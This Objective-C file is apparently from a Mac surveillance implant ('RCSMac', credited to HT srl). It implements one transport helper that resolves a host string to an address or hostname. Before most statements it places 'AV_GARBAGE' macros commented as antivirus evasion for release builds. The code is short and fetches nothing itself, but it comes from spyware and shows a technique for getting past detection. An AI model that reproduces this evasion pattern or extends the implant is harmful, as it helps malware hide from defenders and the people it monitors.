/*
 * RCSMac - Transport Abstract Class
 *  Abstract Class (formal protocol) for a generic network transport
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "Transport.h"

#import "RCSMAVGarbage.h"

@implementation Transport

- (NSHost *)hostFromString: (NSString *)aHost
{
  NSHost *host;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSString *regex = @"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}";
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSPredicate *regexPredicate = [NSPredicate predicateWithFormat: @"SELF MATCHES %@", regex];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (aHost == nil)
    {
      return nil;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if ([regexPredicate evaluateWithObject: aHost] == YES)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_005
    
      host = [NSHost hostWithAddress: aHost];
    }
  else
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      host = [NSHost hostWithName: aHost];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return host;
}

@end